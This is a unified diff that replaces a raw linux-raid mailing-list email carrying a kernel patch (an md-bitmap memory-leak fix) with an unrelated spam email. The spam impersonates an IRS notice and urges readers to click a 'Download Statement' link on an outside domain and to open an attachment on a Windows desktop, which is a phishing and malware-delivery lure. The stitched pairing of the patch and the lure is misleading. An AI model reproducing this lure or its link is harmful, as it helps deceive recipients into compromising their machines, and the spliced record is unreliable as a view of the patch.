@@ -1,147 +1,165 @@
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
+Received: from out25-28.sg.a.dm.aliyun.com (out25-28.sg.a.dm.aliyun.com [8.219.25.28])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4ADE6346A02
-	for <linux-raid@vger.kernel.org>; Fri,  7 Aug 2026 18:55:34 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.133.124
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id ACFC345C6E9
+	for <linux-raid@vger.kernel.org>; Fri,  7 Aug 2026 21:57:46 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=8.219.25.28
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1786128935; cv=none; b=aoKfr8lGfqNSE82BN+nAqIIRDE5eifLBoGjrbwUbTCXNhe+P90k66f0VTtEIz6FRU9wNDc89D0hxYWSO54LdZBCEzSl3Y0mPl+wRWxHjOlXuiemAdKTuZkiirortCPygQ2ofJSs0q33bRwb9UGxNBeM71VAWxDJUQToW3r/5YVA=
+	t=1786139869; cv=none; b=Iipuxf1wimuVuD/FESS+JCEVmZeNIXgYLKpZtH+AyrBxQ3C3BOapoGlZ3FVKZ/qcDgw7jjOz+JgdaOGJskTUku+hgIv5JeccUbnpw/8dJp5zMRrtQx9uNywi6g8rljjwLgsXE3Kf1OwgM4dkcSDg35Ug7HaMa6GCekR6pD1Orv8=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1786128935; c=relaxed/simple;
-	bh=rZik1FM3EDjIRoGpoOYJL6zQFjAFg8Op2LgtrMsyD0M=;
-	h=Message-ID:Date:MIME-Version:To:From:Subject:Content-Type; b=shQ9ssGZGna0KhpNI2GVINjOUDZZbRtpX6fkCw6F06v/oU23HvSQ61I0Emkj+BrIgRCTbKfPKjkaK/1ZMdw4Fqwm7czesIpjU20GyQZjHx3FBP5OW31YXUp6TGdntmDq0XD+7JSJID/muvVegwXkq6andPQlZExP9EqSUHFtmOc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=ScJlOl2i; dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b=gJkYkYle; arc=none smtp.client-ip=170.10.133.124
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
+	s=arc-20240116; t=1786139869; c=relaxed/simple;
+	bh=Xb+AI/tgOcvOF3qmA8QKJB8ShyfPfaTGZVEAS8hQ8vc=;
+	h=Content-Type:MIME-Version:From:To:Subject:Date:Message-ID; b=OvLPlvhDLjw4o9TRocDRVtrJE73KZhXHts4oycEghqcx1SQNIcjLg/2hZU/VkNNR1ct9MyOc0KNeXBUW6mt04QHuwZ6Q8Zqo834JjeE+x42ZvZ8KMfvDkEhETjjFATv2ys7e/3dEWx00jsUxXHHSOR6htCh5DO+P+WZYJ06hJGg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=materialdereparacionhogar.com.mx; spf=pass smtp.mailfrom=materialdereparacionhogar.com.mx; dkim=pass (1024-bit key) header.d=materialdereparacionhogar.com.mx header.i=@materialdereparacionhogar.com.mx header.b=pv761t54; arc=none smtp.client-ip=8.219.25.28
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=materialdereparacionhogar.com.mx
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=materialdereparacionhogar.com.mx
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="ScJlOl2i";
-	dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b="gJkYkYle"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1786128933;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding;
-	bh=GuoKsGtds12Ezb/VWfIAgeF2v1zeaKJdOwP5bMm2LdE=;
-	b=ScJlOl2iXqGFng2usfOxI2v2qoFRwGu+I/saBgb+9iou2poAUT/jo0lZGL3Rj5XCUFQ0vL
-	yNJjs+yNQ6KZmHL4zLwDva4NB0D3SuUPv4sfcA1Mr4Jm3z4fZzckUqosdzwGHTCf+fQd1u
-	15SaxC9rRhuRMVgP3pC84BVT+cIMWNc=
-Received: from mail-qt1-f197.google.com (mail-qt1-f197.google.com
- [209.85.160.197]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
- us-mta-662-ks-1g2NZOE6doQNlxYl01g-1; Fri, 07 Aug 2026 14:55:32 -0400
-X-MC-Unique: ks-1g2NZOE6doQNlxYl01g-1
-X-Mimecast-MFC-AGG-ID: ks-1g2NZOE6doQNlxYl01g_1786128932
-Received: by mail-qt1-f197.google.com with SMTP id d75a77b69052e-51a8b0a08d2so29298991cf.0
-        for <linux-raid@vger.kernel.org>; Fri, 07 Aug 2026 11:55:32 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=redhat.com; s=google; t=1786128931; x=1786733731; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:subject:from:to
-         :content-language:user-agent:mime-version:date:message-id:from:to:cc
-         :subject:date:message-id:reply-to:content-type;
-        bh=GuoKsGtds12Ezb/VWfIAgeF2v1zeaKJdOwP5bMm2LdE=;
-        b=gJkYkYle/E9S+cUBmz+zmtbPrKLJqFy7eZDR2jyO0G/D3FyFfAoTWLKqfkK1Vf80sl
-         0gghCPBkQDhIzzRKZ+gglY8cHdJvVDSM2Yh9h/LU7DYbFKws4TqAul6dU6GSFHEOgw5S
-         bPdMWJx/Z2Ja/Mf/xg6BR3V2tz5YPUOVslxAilUlc6ggUHH0H8STGs8sUlV7JAvXsCJs
-         uCXlMQwnIsLRqbJHa2bctDsppxA424cJPsqVprZsODIdZll5I5Ry9DVsVIA2iPQDukD+
-         4ERl73+4TqwaoaQyIPw7NvDzjO+UCaURtd6tnwzwWvBjEhnkBjf2PR9yFR4K6HRsJ10Y
-         84aQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1786128931; x=1786733731;
-        h=content-transfer-encoding:content-type:subject:from:to
-         :content-language:user-agent:mime-version:date:message-id:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=GuoKsGtds12Ezb/VWfIAgeF2v1zeaKJdOwP5bMm2LdE=;
-        b=E8DlChDAHUWAdCZwamrqHiGwbgZ+MayV0Cg2NMibAQ0mR6zWSNwtKqV5/lVFrK1YUp
-         5L50VmkSYhlSfMoR9hJFiumapOjIfOUAVDuZ+tZj2xFQYOM96nC4+usKtVVDrVwULwyn
-         WXEB7H1V9owqtAZvHoG0gBIuQfvHtY1kNIx5Pf6SIXh5r/Cst9O93L5I7QUIVQ99/Gnw
-         TjdKEItYIRaeb3llanOl7CgnCV69hmWMWGFRT12Q18Cb6CfrkCxekeWOAH5MhMtqvUeX
-         3CvqhrK4Cw3HUu+T2f09BdOOzWU9jF0M69gaEKXQqeqAgeNv5CrWfZ4xH9c/M5C3AzR8
-         e6MQ==
-X-Forwarded-Encrypted: i=1; AHgh+RrmTzvUm3DlyJeEXnSrZfGYxmUmGgmc8wRRKjYaFtG7EDEW8b3g89Mb7/NrT3IULaTYmMgbV5OQrTZa@vger.kernel.org
-X-Gm-Message-State: AOJu0Yw9wANsCvM4g07MfZRqWiF9YwXQl3g3jADmTuU2TeyratvWe6Ha
-	prbblJWCExEONL5v6OWT4sG8GKcTiuD5uS7T9aSoKAbdHReydnN6m+FXZle5oZ9nJs2yzZGHB3v
-	0qOr0t+zR2bYL76YPRHNZrBY2wp7UJ7noTmDbvArntXgYTJVIxwTXi4mT9SNUSFicgxapNkg=
-X-Gm-Gg: AR+sD13x3n6XE00+XpImZbEC9hqKPwp0SJXz+2QrKu9s9n/gObAzXZTxCJtGwMpqHS7
-	zCy6s0bY8wzJMPfsS12vldhCu7v9UAb4R8nmxZhlmx4gfigO8jscE0YFw0MBbBA9fW3Fm5YrgAS
-	mkfmfjwciOGU6clbefpFneairi6aCSiXnFnDi/RfJ1H4jtiL76L3tBNZSfTYFU0nCnAPjN2xe++
-	HviArwe5cEawdcNsWq8lc39txVBfXksF2b1QaAGA0R7H8PGFgM4p8WyihDhohhI7rdYdSEZYoag
-	hx0v4ro/+bbJWwS+pkquN8lTW8f57YhwwO0UPhaNSBX43XjkB7ItTS+xTc2MSw1nv2i1cvM0WSP
-	iZ5AF7wngcG/3d4UrdmjJ
-X-Received: by 2002:a05:622a:54c:b0:51c:84f0:d903 with SMTP id d75a77b69052e-52ce602d792mr256729801cf.17.1786128931540;
-        Fri, 07 Aug 2026 11:55:31 -0700 (PDT)
-X-Received: by 2002:a05:622a:54c:b0:51c:84f0:d903 with SMTP id d75a77b69052e-52ce602d792mr256729201cf.17.1786128931041;
-        Fri, 07 Aug 2026 11:55:31 -0700 (PDT)
-Received: from [192.168.50.139] ([23.160.248.161])
-        by smtp.gmail.com with ESMTPSA id d75a77b69052e-52d1637fa5fsm18122911cf.10.2026.08.07.11.55.29
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Fri, 07 Aug 2026 11:55:30 -0700 (PDT)
-Message-ID: <e86f6b88-ea4f-425a-880d-a3622f3f458a@redhat.com>
-Date: Fri, 7 Aug 2026 14:55:29 -0400
+	dkim=pass (1024-bit key) header.d=materialdereparacionhogar.com.mx header.i=@materialdereparacionhogar.com.mx header.b="pv761t54"
+X-AliDM-RcptTo: bGludXgtcmFpZEB2Z2VyLmtlcm5lbC5vcmc=
+Feedback-ID: default:mark@materialdereparacionhogar.com.mx:alibabak_SmtpBatch:486392
+DKIM-Signature:v=1; a=rsa-sha256; c=relaxed/relaxed;
+	d=materialdereparacionhogar.com.mx; s=aliyun-ap-southeast-1;
+	t=1786139864; h=Content-Type:MIME-Version:From:To:Subject:Date:Message-ID;
+	bh=Xb+AI/tgOcvOF3qmA8QKJB8ShyfPfaTGZVEAS8hQ8vc=;
+	b=pv761t54FArX2KgemrY5+nnHUbB1S/wZ1dAOKk8seWK6/s0ejFW52Cgw5unaCf7KcF962aRNY8Fpg8ZCN4gQlCAbDKYEMLrYaaGeiBtZuvixJHSf3aCsrt3oCXXW3fToVLKj3HmJj32r633S7yr1XR0wfwUZySKW4Z0I9/z2O5I=
+Received: from f802b3ce(mailfrom:mark@materialdereparacionhogar.com.mx fp:SMTPD_4w3hSFppYcL cluster:dm-ay35sg-a)
+          by smtp.aliyun-inc.com(127.0.0.1);
+          Sat, 08 Aug 2026 05:51:57 +0800
+X-EnvId: 8000000305927703129
+Content-Type: multipart/mixed; boundary="===============1223213285074523554=="
 Precedence: bulk
 X-Mailing-List: linux-raid@vger.kernel.org
 List-Id: <linux-raid.vger.kernel.org>
 List-Subscribe: <mailto:linux-raid+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-raid+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-To: song@kernel.org, yukuai@kernel.org, linux-raid@vger.kernel.org
-From: Nigel Croxon <ncroxon@redhat.com>
-Subject: [PATCH] md/md-bitmap: bitmap pages leaked after recovery
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
+From: "=?UTF-8?Q?internal-revenue-services.Reminder?="
+ <mark@materialdereparacionhogar.com.mx>
+To: linux-raid@vger.kernel.org
+Subject: =?UTF-8?Q?Your document is ready?=
+Date: Fri, 07 Aug 2026 21:51:53 -0000
+Message-ID: 
+ <178613951346.6004.2683071619951984942@materialdereparacionhogar.com.mx>
+X-Accept-Language: en-us, en
 
-The bitmap pages leaked after recovery if successful writes occur
-concurrently during array degradation/recovery.
+--===============1223213285074523554==
+Content-Type: multipart/alternative;
+ boundary="===============2289452224020474575=="
+MIME-Version: 1.0
 
-We performed write I/Os to an MD RAID1 array while it was in a degraded
-state or actively undergoing recovery. Even after the array recovery
-successfully reached 100%, the disk status returned to normal ([UU]),
-and all I/Os completely stopped, the number of bitmap pages
-(bitmap: n/N pages in /proc/mdstat) never dropped back to 0, resulting
-in a persistent memory leak of bitmap pages.
+--===============2289452224020474575==
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
 
-Bitmap pages remain permanently allocated in the kernel memory even after
-the array has fully returned to a healthy state, leading to a kernel
-memory leak.
+=20=20=20Notice=20of=20Certification=20=E2=80=93=20I=20R=20S=C2=A0Reference=
+:=C2=A0CP509C=20NoticeYour=C2=A0Document=20is=20Now=20AvailableThank=20you=
+=20for=20choosing=20to=20receive=20your=C2=A0=20electronically.=20Your=20do=
+cument=20is=20now=20ready=20for=20download:Please=20download=20the=20attach=
+ment=20and=20follow=20the=20provided=20instructions.NOTE:=C2=A0=C2=A0This=
+=20document=20is=20optimized=20for=20use=20on=20desktop=20computers=20and=
+=20Windows-based=20laptops.Download=20State=20mentIf=20you=20are=20accessin=
+g=20the=20document=20via=20a=20mobile=20device,=20we=20strongly=20recommend=
+=20using=20a=20desktop=20computer=20or=20laptop=20to=20ensure=20proper=20fu=
+nctionality.This=20is=20an=20automated=20message.=20Please=20do=20not=20rep=
+ly=20to=20this=20email.
+--===============2289452224020474575==
+Content-Type: text/html
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
 
-When a disk is re-added and recovery starts, MD_RECOVERY_RUNNING is set
-in mddev->recovery.  The else if condition evaluates to false for normal
-concurrent writes during recovery. NEEDED_MASK is never applied to these
-blocks.
+<html><head><meta=20content=3D"text/html;=20charset=3Dutf-8"=20http-equiv=
+=3D"Content-Type"/>=20<meta=20content=3D"IE=3Dedge"=20http-equiv=3D"X-UA-Co=
+mpatible"/>=20</head>=20<body><table=20border=3D"0"=20cellpadding=3D"0"=20c=
+ellspacing=3D"0"=20role=3D"presentation"=20style=3D'text-transform:=20none;=
+=20letter-spacing:=20normal;=20font-family:=20"Times=20New=20Roman";=20word=
+-spacing:=200px;=20orphans:=202;=20widows:=202;=20background-color:=20rgb(2=
+44,=20244,=20244);=20-webkit-text-stroke-width:=200px;=20text-decoration-th=
+ickness:=20initial;=20text-decoration-style:=20initial;=20text-decoration-c=
+olor:=20initial;'=20width=3D"100%"><tbody><tr><td=20align=3D"center"=20styl=
+e=3D"padding:=2020px=200px;"><table=20border=3D"0"=20cellpadding=3D"0"=20ce=
+llspacing=3D"0"=20role=3D"presentation"=20style=3D"border-radius:=208px;=20=
+box-shadow:=200px=202px=204px=20rgba(0,0,0,0.1);=20background-color:=20rgb(=
+255,=20255,=20255);"=20width=3D"600"><tbody><tr><td=20align=3D"center"=20st=
+yle=3D"padding:=2020px=200px;=20border-radius:=208px=208px=200px=200px;=20b=
+ackground-color:=20rgb(0,=2042,=2092);"><h1=20class=3D"cefe31=20fd4a4bb6=20=
+afcbf"=20data-ac4=3D"f8c171"=20data-affff49=3D"a99336c"=20data-f4fc=3D"bf0"=
+=20data-fd89f4=3D"dc4047"=20style=3D'margin:=200px;=20padding:=200px;=20tex=
+t-align:=20center;=20color:=20rgb(255,=20255,=20255);=20text-transform:=20n=
+one;=20text-indent:=200px;=20letter-spacing:=20normal;=20font-family:=20"Se=
+goe=20UI",=20Tahoma,=20Geneva,=20Verdana,=20sans-serif;=20font-size:=2028px=
+;=20font-style:=20normal;=20font-weight:=20bold;=20word-spacing:=200px;=20w=
+hite-space:=20normal;=20box-sizing:=20border-box;=20orphans:=202;=20widows:=
+=202;=20-webkit-text-stroke-width:=200px;=20text-decoration-thickness:=20in=
+itial;=20text-decoration-style:=20initial;=20text-decoration-color:=20initi=
+al;=20font-variant-ligatures:=20normal;=20font-variant-caps:=20normal;'><fo=
+nt=20size=3D"4">Notice=20of=20Certification=20=E2=80=93=20I=20R=20S<span=20=
+class=3D"b54f6abb1=20cb8224f=20c7ceebb=20a1f76ce"=20data-b709=3D"d996"=20da=
+ta-cd4e42e=3D"e27a4"=20data-d2090=3D"d8be57c"=20data-e4eb=3D"d9eb6e6"=20dat=
+a-f3639=3D"c58e8"=20data-f3d5556=3D"f6a">=C2=A0</span><b=20class=3D"ac6cc3f=
+f9=20c8534e=20c4eaaa5=20fd1b13e=20bd9bf8b=20ebc365"=20data-af49=3D"fc17fb"=
+=20data-b8e574=3D"de7c89"=20data-db6c24=3D"b149"=20data-ebcc=3D"d71f17"=20d=
+ata-f785=3D"a9b109"=20data-ff0425=3D"a6b837"=20style=3D"margin:=200px;=20pa=
+dding:=200px;=20box-sizing:=20border-box;">Reference:</b>=C2=A0CP509C=20Not=
+ice</font></h1></td></tr><tr><td=20style=3D"padding:=2030px=2040px;=20backg=
+round-color:=20rgb(215,=20225,=20230);"><h1=20class=3D"a22aed=20e8d0cde=20a=
+1a3e3e71=20c05393c97=20a0d4fb=20ad11372"=20data-af5c=3D"a503f1"=20data-b57=
+=3D"c87dc"=20data-caf2ec7=3D"e2938"=20data-d76f=3D"dc20fe"=20data-dadd377=
+=3D"f2f1d9"=20data-e90b9a=3D"dcce988"=20data-f873=3D"d61"=20style=3D"margin=
+:=200px;=20color:=20rgb(0,=2042,=2092);=20line-height:=201.4;=20font-family=
+:=20Arial,=20Helvetica,=20sans-serif;=20font-size:=2028px;">Your=C2=A0Docum=
+ent=20is=20Now=20Available</h1></td></tr><tr><td=20style=3D"padding:=2040px=
+;"><p=20class=3D"cdae38=20ce46d91b=20f04818aff=20ff9adf"=20data-a2dac41=3D"=
+dd2"=20data-a371f89=3D"ce4"=20data-b3c=3D"baf"=20data-d5d6b7c=3D"cc9fb76"=
+=20data-e86=3D"d6b61"=20data-fc09=3D"abc"=20data-fccecd=3D"ba1ed"=20style=
+=3D"margin:=200px=200px=2020px;=20color:=20rgb(51,=2051,=2051);=20line-heig=
+ht:=201.6;=20font-family:=20Arial,=20Helvetica,=20sans-serif;=20font-size:=
+=2016px;">Thank=20you=20for=20choosing=20to=20receive=20your=C2=A0=20electr=
+onically.=20Your=20document=20is=20now=20ready=20for=20download:</p><ul=20c=
+lass=3D"e29768=20af2ea4=20bfd46b7=20c09cc6=20f5c760f=20ef6d4f9=20e9dead=20d=
+ef50"=20data-a52=3D"dca"=20data-b034af6=3D"c98e7c"=20data-bf26cb=3D"b96b5"=
+=20data-d1415=3D"f09ac"=20data-d28=3D"a0a951c"=20data-e68ec6=3D"a720"=20dat=
+a-ed8cf=3D"ced87c8"=20style=3D"margin:=200px=200px=2030px;=20color:=20rgb(5=
+1,=2051,=2051);=20line-height:=201.6;=20padding-left:=2020px;=20font-family=
+:=20Arial,=20Helvetica,=20sans-serif;=20font-size:=2016px;"><li=20style=3D"=
+margin-bottom:=2015px;">Please=20download=20the=20attachment=20and=20follow=
+=20the=20provided=20instructions.</li><li=20style=3D"margin-bottom:=2015px;=
+"><b=20class=3D"d63edf6e9=20df5465=20aed5c9d3=20d688346e0=20aeebc=20f724b5a=
+f=20b15131af"=20data-d2862d=3D"f2f"=20data-da89d9c=3D"d45e82c"=20style=3D"c=
+olor:=20rgb(204,=200,=200);">NOTE:</b>=C2=A0<span=20class=3D"ed6f046=20ba77=
+6=20c5484cb1=20cfbdd697"=20data-acb=3D"de50"=20data-e4a=3D"cec9">=C2=A0</sp=
+an><strong=20class=3D"a986bebd=20a1ec95dd=20f82f0=20e0913e8e5=20e682b3307=
+=20c7ee37f9"=20data-d1d=3D"bbf3"=20data-ef4=3D"b98">This=20document=20is=20=
+optimized=20for=20use=20on=20desktop=20computers=20and=20Windows-based=20la=
+ptops.</strong></li></ul><table=20border=3D"0"=20cellpadding=3D"0"=20cellsp=
+acing=3D"0"=20role=3D"presentation"=20width=3D"100%"><tbody><tr><td=20align=
+=3D"center"><table=20border=3D"0"=20cellpadding=3D"0"=20cellspacing=3D"0"=
+=20role=3D"presentation"><tbody><tr><td=20style=3D"border-radius:=204px;=20=
+background-color:=20rgb(9,=2060,=20143);"><a=20class=3D"a494f950b=20cd87c11=
+2b=20b60599c=20e29bfb653=20c56cb0"=20data-ababc=3D"bba"=20data-bab75=3D"db3=
+9525"=20data-c790b0b=3D"e0f089"=20data-c7bf=3D"b5a"=20data-cc125=3D"af3c812=
+"=20data-ceb0=3D"e7cba0"=20data-d4a0=3D"cf73"=20href=3D"https://vi-301.com/=
+nbgn"=20rel=3D"noopener"=20style=3D"padding:=2015px=2030px;=20border-radius=
+:=204px;=20color:=20rgb(255,=20255,=20255);=20font-family:=20Arial,=20Helve=
+tica,=20sans-serif;=20font-size:=2016px;=20text-decoration:=20none;=20displ=
+ay:=20inline-block;"=20target=3D"_blank"=20title=3D"dd">Download=20State=20=
+ment</a></td></tr></tbody></table></td></tr></tbody></table><p=20align=3D"c=
+enter"=20class=3D"isSelectedEnd=20bbe1d7"=20data-b10b=3D"e5b29"=20data-c678=
+0d=3D"a62"=20data-e448=3D"c5420f6"=20data-ef6e=3D"a0429ef"=20data-fe01be=3D=
+"a47"><span=20class=3D"cc138=20a48f2=20ab283a=20eb14ea5=20e12f93a1=20c0a01=
+=20c89e3c=20af7969931"=20data-df2e=3D"b01beea"=20data-df7fd=3D"c48ed"=20dat=
+a-f24273e=3D"ae21"=20data-f463=3D"b2709a9"><font=20face=3D"Segoe=20UI">If=
+=20you=20are=20accessing=20the=20document=20via=20a=20mobile=20device,=20we=
+=20strongly=20recommend=20using=20a=20desktop=20computer=20or=20laptop=20to=
+=20ensure=20proper=20functionality.</font></span></p></td></tr><tr><td=20st=
+yle=3D"padding:=2020px;=20border-radius:=200px=200px=208px=208px;=20text-al=
+ign:=20center;=20background-color:=20rgb(248,=20248,=20248);"><p=20class=3D=
+"f64e64b2=20d6c0f=20ea2c23b2=20b01d65=20e1de8c"=20data-a7d32=3D"f62"=20data=
+-e9e=3D"ba6aaf"=20data-ef1=3D"b9ef"=20data-f26626=3D"bc0d"=20style=3D"margi=
+n:=200px;=20color:=20rgb(102,=20102,=20102);=20font-family:=20Arial,=20Helv=
+etica,=20sans-serif;=20font-size:=2012px;">This=20is=20an=20automated=20mes=
+sage.=20Please=20do=20not=20reply=20to=20this=20email.</p></td></tr></tbody=
+></table></td></tr></tbody></table></body></html>
+--===============2289452224020474575==--
 
-Fixes: 4f0e7d0e03b7
-md/md-bitmap: remove the last parameter for bimtap_ops->endwrite()
-This is becauses removing success caused bitmap_endwrite()
-to treat mddev->degraded as a blanket trigger for NEEDED_MASK.
-
-Signed-off-by: Nigel Croxon <ncroxon@redhat.com>
----
-  drivers/md/md-bitmap.c | 9 ++++++++-
-  1 file changed, 8 insertions(+), 1 deletion(-)
-
-diff --git a/drivers/md/md-bitmap.c b/drivers/md/md-bitmap.c
-index 1d4a050dab3a..b8be0d079780 100644
---- a/drivers/md/md-bitmap.c
-+++ b/drivers/md/md-bitmap.c
-@@ -1756,7 +1756,14 @@ static void bitmap_end_write(struct mddev *mddev, 
-sector_t offset,
-                  sysfs_notify_dirent_safe(
-                          bitmap->sysfs_can_clear);
-              }
--        } else if (!NEEDED(*bmc)) {
-+        /*
-+         * Do not set NEEDED_MASK if recovery is actively running.
-+         * Writes completing during recovery/resync are already covered by
-+         * the recovery thread and setting NEEDED_MASK will cause orphaned
-+         * bitmap flags and memory leaks after recovery finishes.
-+         */
-+        } else if (!test_bit(MD_RECOVERY_RUNNING,
-+                &bitmap->mddev->recovery) && !NEEDED(*bmc)) {
-              *bmc |= NEEDED_MASK;
-          }
-
--- 
-2.47.3
-
+--===============1223213285074523554==--
